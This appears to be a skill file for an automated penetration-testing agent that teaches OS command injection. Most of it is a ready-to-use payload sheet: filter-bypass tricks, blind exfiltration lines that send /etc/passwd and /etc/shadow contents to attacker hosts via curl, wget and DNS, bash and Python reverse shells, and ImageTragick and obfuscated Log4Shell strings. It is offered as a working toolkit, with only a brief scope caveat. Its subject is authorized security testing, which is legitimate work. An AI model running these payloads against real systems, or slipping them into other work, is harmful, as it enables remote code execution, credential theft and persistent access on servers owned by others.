---
name: command-injection
description: OS command injection testing covering all injection contexts, bypass techniques, and blind exfiltration
---

# Command Injection

OS command injection occurs when user-controlled input is passed to a shell interpreter without proper sanitization. Even single characters (`;`, `|`, `` ` ``) can pivot a web request into full RCE. Modern apps hide injection in non-obvious places: image processors, archive handlers, DNS lookups, and CI/CD pipelines.

## Attack Surface

**Direct Execution Sinks**
- `system()`, `exec()`, `popen()`, `shell_exec()`, `passthru()` (PHP)
- `subprocess.run(shell=True)`, `os.system()`, `os.popen()` (Python)
- `Runtime.exec()` with string concat (Java), `child_process.exec()` (Node)
- `backtick operators`, `$()` expansion in shell scripts

**Indirect / Feature-Level**
- Image/video processing: ImageMagick, ffmpeg, exiftool
- Archive creation/extraction: zip, tar, 7z with filenames
- PDF generation: wkhtmltopdf, phantomjs, puppeteer CLI wrappers
- Network tools: ping, nslookup, dig, curl, wget invoked server-side
- Git operations: `git clone`, `git archive` with attacker-controlled URLs
- Log shipping and monitoring agent configs
- CI/CD pipelines parsing user data in build steps

**Input Vectors**
- Filename, username, email, hostname, IP address, domain fields
- File contents (config files, uploaded scripts, CSV columns)
- HTTP headers used in shell scripts (User-Agent, Referer, X-Forwarded-For)
- URL path segments used in file operations

## Injection Operators

| Operator | Behavior | Example |
|----------|----------|---------|
| `;` | Sequential execution | `ping host; id` |
| `&&` | Execute if previous succeeds | `ping host && id` |
| `\|\|` | Execute if previous fails | `ping FAIL \|\| id` |
| `\|` | Pipe output | `echo x \| id` |
| `` ` `` | Command substitution (bash) | `` ping `id` `` |
| `$()` | Command substitution | `ping $(id)` |
| `\n` / `%0a` | Newline injection in args | `ping -c1\nid` |
| `>` / `>>` | Output redirection | `id > /tmp/x` |

## Key Vulnerabilities

### In-Band (Output Reflected)

Direct output in response body or error messages:
```
; cat /etc/passwd
| whoami
$(id)
`uname -a`
& net user (Windows)
```

### Blind Command Injection

No output in response — use timing or out-of-band:

**Timing**
```
; sleep 10
& ping -c 10 127.0.0.1
; timeout /t 10 (Windows)
```

**DNS/HTTP exfiltration (OAST)**
```
; curl http://BURP_COLLABORATOR/?x=$(whoami|base64)
; nslookup $(cat /etc/hostname).attacker.tld
; wget -q -O- http://attacker/$(id|base64 -w0)
```

**File write**
```
; id > /var/www/html/output.txt
; whoami >> /tmp/x && curl http://attacker/$(cat /tmp/x|base64)
```

### Argument Injection

When the command is fixed but arguments are user-controlled:
```
# curl --upload-file attacker.php http://internal/
# git clone git://attacker --upload-pack=id
# find . -name USER_INPUT -exec id \;
# ImageMagick: "| id #" as filename (ImageMagick CVE-2016-3714)
# ffmpeg: input file as -i http://attacker/ssrf.m3u8
```

### Windows-Specific

```
& whoami
| net user
%0a dir
cmd /c whoami
powershell -c "whoami"
```

## Bypass Techniques

**Whitespace Alternatives**
```bash
{id}          # brace expansion
$IFS          # internal field separator
${IFS}
X=$'\x20'&&id # hex space
cat</etc/passwd  # no space needed
```

**Quote/Character Tricks**
```bash
c'a't /etc/passwd
wh''oami
/bin/c??  # glob expansion
/usr/bin/id
$(printf "\x69\x64")  # hex chars
```

**Filter Bypasses**
```bash
# Semicolon blocked
%0a id          # URL-encoded newline
\nid            # backslash-n
# Pipe blocked
$(id)
`id`
# Space blocked
{cat,/etc/passwd}
IFS=,;cat,/etc/passwd
# Dot blocked (no extension)
bash</dev/tcp/attacker/4444
```

**Encoding**
```
URL encode: %3b = ;, %7c = |, %26 = &
Double encode: %253b
Unicode: fullwidth chars for operators
```

**Environment Variable Abuse**
```bash
$PATH=/tmp:$PATH  # prepend malicious binary
env -i PATH=/tmp:$PATH command
```

## Out-of-Band Exfiltration

When responses don't reflect output:
```bash
# DNS (single lookup)
nslookup $(whoami).attacker.tld

# DNS (file contents)
for x in $(cat /etc/passwd | tr ' ' '_'); do nslookup $x.attacker.tld; done

# HTTP via curl
curl "http://attacker/?d=$(cat /etc/shadow|base64 -w0)"

# HTTP via wget
wget "http://attacker/?d=$(id|base64)"

# Write to web root
id > /var/www/html/$(date +%s).txt

# Reverse shell via bash
bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'

# Reverse shell via python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),x) for x in(0,1,2)];subprocess.run(["/bin/bash"])'
```

## Special Cases

### ImageMagick (CVE-2016-3714 / ImageTragick)
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/|id > /tmp/exec)'
pop graphic-context
```

### PHP Mail Function
```php
// mail($to, $subject, $body, $headers, $extra_params)
// extra_params = "-f attacker@x.tld -be ${run{/usr/bin/id}{>/tmp/x}}"
```

### Log4Shell (CVE-2021-44228)
```
${jndi:ldap://attacker.tld/a}
${${lower:j}ndi:ldap://attacker/a}
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker/a}
```

## Testing Methodology

1. **Map execution sinks** — Find every feature that invokes system tools (image ops, archives, network checks, export functions)
2. **Inject separators** — Test `;`, `|`, `&&`, `||`, newlines in every input field
3. **Timing oracle** — `sleep 5` / `ping -c 5 127.0.0.1` to confirm blind injection
4. **OAST exfiltration** — DNS/HTTP callback with `whoami` or hostname
5. **Enumerate context** — User, groups, env vars, filesystem layout
6. **Argument injection** — When command is fixed, test flags and special-meaning values
7. **OS detection** — `uname -a` (Linux) vs `ver` (Windows) for platform-specific payloads

## Validation

1. Prove command execution with time-based oracle (reliable, repeatable delay differential)
2. Confirm via OAST callback showing server-initiated DNS/HTTP request with data
3. Show `id`/`whoami` output or `/etc/hostname` via OOB for identity context
4. Stop at confirming execution — avoid file reads of sensitive data or reverse shells unless scope allows

## False Positives

- Time delays from network/DB/processing latency unrelated to injected sleep
- DNS lookups for legitimate reasons
- Shell metacharacters in inputs that are properly escaped before execution
- Use of parameterized command execution APIs (e.g., `subprocess.run(list_form)`)

## Impact

- Direct RCE as web server user or container process
- Credential/secret exfiltration from environment and config files
- Lateral movement to internal services via network access
- Container escape, cloud metadata access, and persistence

## Pro Tips

1. Try newline (`%0a`) injection first — often forgotten in blacklists targeting `;` and `|`
2. `$IFS` beats space filters in Bash; use it liberally
3. ImageMagick/ffmpeg features are goldmines for blind injection — read their parsers
4. Argument injection is more reliable than operator injection in newer apps
5. Use Burp Collaborator/interactsh for OAST in blind scenarios
6. Glob expansion (`/???/??/id`) bypasses keyword filters without encoding
7. When output is blocked, write to web root or cron-reachable path for async retrieval
8. Always test Windows equivalents (`&`, `|`, `cmd /c`) on ASP.NET / IIS stacks

## Summary

Command injection turns string concatenation into shell access. Any framework that builds a shell command with user data is vulnerable. Test separators, use OAST for blind cases, and always check indirect sinks like image processors and archive handlers.
